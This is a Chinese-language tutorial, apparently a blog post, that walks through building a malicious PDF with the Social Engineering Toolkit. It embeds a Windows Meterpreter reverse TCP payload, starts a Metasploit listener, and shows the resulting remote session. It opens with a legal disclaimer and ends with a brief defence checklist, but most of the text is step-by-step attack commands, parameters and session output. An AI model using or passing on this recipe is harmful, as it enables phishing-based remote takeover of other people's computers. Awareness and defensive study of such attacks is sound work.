```
本文内容及所涉及的技术，仅限用于合法授权下的安全研究、教学演示、
以及漏洞复现。严禁将本文技术用于未授权的渗透、监听、植入、操控行为。

本文内容仅限安全研究、漏洞复现与教学演示使用！

使用者必须在完全理解并接受本声明的前提下继续阅读与操作。
凡将本文所述方法用于非法用途者，一切法律后果由使用者本人承担。

请严格遵守所在地的法律法规，特别是以下中国法律条款：

📜 《中华人民共和国网络安全法》 第十二条：
禁止任何组织或个人利用网络危害国家安全、煽动颠覆政权等活动。

📜 《中华人民共和国刑法》 第二百八十五条至二百八十七条：
非法入侵计算机系统、篡改或破坏数据将追究刑责。

📜 《中华人民共和国数据安全法》 第三条、第十七条：
数据处理活动必须合法合规，严禁非法获取、传输或泄露数据。

🚫 强烈禁止以下行为：

- 向他人 APK 植入恶意代码并传播
- 上传恶意程序至应用市场
- 在未授权设备或网络环境中运行本篇提及的技术

⚖️ 非法使用将触犯法律，作者不承担由此引发的任何后果。

🧪 本文操作均在本地沙箱环境下进行，示例所用 APK 为自定义构建 demo，用于演示完整技术链路，非实际恶意软件。

💡 特别提醒：
本文所涉及操作可能包含网络通信、远程访问、敏感权限调用等，
必须在受控环境下、获得明确授权后进行。
未经许可的任何行为都将被视为违法攻击。

📛 作者立场中立，仅为安全教育目的演示，不对滥用技术行为负责。
```

---

### PDF 也能是武器

当我们说到「本地涉入」、「文件根级」时，很多人第一反应是 `.apk`、`.exe`、`.sh`这种打开后明显有危险的文件。

但是你有没有想过：一份看上去正常的 PDF ，在软件程序已经被别有用心的情况下也可以是一份致命的 payload？

这篇文章我会手把手教你：

- 黑客如何使用 SET (社工攻击框架) 来生成恶意 PDF
- 如何启动监听器等待目标上钩
- 我们为什么需要增强文件安全意识

---

### 工具简介：Social Engineering Toolkit

我们使用 Kali Linux 自带的 SET (Social Engineering Toolkit) 工具，它能快速构建带有反弹木马的恶意 PDF。

安装命令（如未安装）：

```bash
git clone https://github.com/trustedsec/social-engineer-toolkit.git
cd social-engineer-toolkit
pip3 install -r requirements.txt
sudo python3 setup.py install
```

Social Engineering Toolkit (社工攻击框架，简称 SET) 是 Kali Linux 中一个完全为社工攻击而生的工具包。

只需要执行：

```bash
sudo setoolkit
```

菜单选择：

```bash
Social-Engineering Attacks > Spear-Phishing Attack Vectors > Create a FileFormat Payload > Adobe PDF Embedded EXE Social Engineering > Rename > Windows Meterpreter Reverse TCP > {IP_地址} > {端口} >  2 > {名称.pdf}
```

接下来，设置参数：

- Payload 类型：选择 windows/meterpreter/reverse_tcp
- LHOST（本地 IP）：如 192.168.56.1 或 VPN IP（建议用 ip a 查看 tun0）
- LPORT（监听端口）：常用 4444
- 生成文件名：如 evil.pdf

输出路径：

> 生成的 PDF 通常保存在：`/root/.set/`

PDF 文件位于你的 Kali Linux 目录中（打开 Root Terminal Emulator）：

然后执行以下命令：

```bash
cd /root/.set
mv {PDF文件名} /home/{你的用户名}/Desktop
# 我的例子是/home/linger/Desktop，可以用pwd命令确认路径
# mv evil.pdf /home/linger/Desktop/
```

---

### 启动监听器等待目标上钩

```bash
sudo msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.56.1 			# 您的IP地址
set LPORT 4444         			# 端口
run
```

一旦目标打开 PDF，反向连接建立，Shell 即到你手上！

```bash
[*] Meterpreter session 1 opened
meterpreter > sysinfo
Computer        : TARGET-PC
OS              : Windows 10 Pro x64
```

你现在已经拥有对方机器的远程控制权限。

---

### 如何防范这种攻击？

你应该牢记：
⚠️ 永远不要轻信来源不明的 PDF
⚠️ 使用沙箱（如 Windows Sandbox）或虚拟机打开文件
⚠️ 禁用 PDF 阅读器中的自动脚本执行
⚠️ 安装 IDS/IPS，检测异常出网行为
⚠️ 每个终端部署 EDR（如 CrowdStrike、SentinelOne）

---

恶意 PDF 攻击不是新鲜事，但它依然是黑产日常武器库中的常规选手。

写这篇文章的目的，不是教你当黑客或搞破坏，而是告诉你：

🔐 如果你连他们是怎么攻击的都不知道，你要怎么防？
提升意识，是网络安全的第一步!
